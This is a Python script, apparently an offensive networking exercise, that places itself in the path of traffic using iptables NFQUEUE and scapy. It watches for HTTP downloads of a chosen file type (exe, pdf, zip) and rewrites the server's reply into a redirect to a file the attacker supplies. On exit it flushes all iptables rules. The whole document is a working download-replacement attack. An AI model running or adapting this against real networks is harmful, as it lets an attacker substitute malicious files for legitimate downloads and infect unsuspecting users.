import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import argparse
import subprocess

ack_list = []


def get_input():
    agp = argparse.ArgumentParser()
    agp.add_argument("--chains", "-c", dest="chains", default="FORWARD", nargs="*",
                     help="(FORWARD)The chains thorough which the packets flows.\n"
                          "Eg: (FORWARD, INPUT, OUTPUT)")
    agp.add_argument("--queue_num", "-q", dest="queue_num", default="0",
                     help="(0)The queue number to store the packets.")
    agp.add_argument("--file_type", "-f", dest="file_type", help="The extension of the file.(exe, pdf, zip ...)",
                     required=True)
    agp.add_argument("--replace_file", "-rf", dest="replace_file", help="The file location to replace the download.",
                     required=True)
    return agp.parse_args()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                if file_type in str(scapy_packet[scapy.Raw].load):
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(f"[+] {file_type} Request")

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing File")
                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " \
                                                   f"{replace_file}\n\n"
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_packet))
    except IndexError:
        pass

    packet.accept()


params = get_input()
chains = params.chains
queue_num = params.queue_num
file_type = params.file_type
replace_file = params.replace_file

for i in range(len(chains)):
    subprocess.call(["iptables", "-I", chains[i], "-j", "NFQUEUE", "--queue-num", queue_num])
    print("[*]Adding", chains[i], "chain to NFQUEUE of Queue number", queue_num, ".")

queue = NetfilterQueue()
queue.bind(int(queue_num), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("\r[+]CTRL+C Detected.\n[+]Flushing iptables.")
    subprocess.call("iptables --flush;iptables --table nat --flush;"
                    "iptables --delete-chain;iptables --table nat --delete-chain;iptables -P FORWARD ACCEPT",
                    shell=True)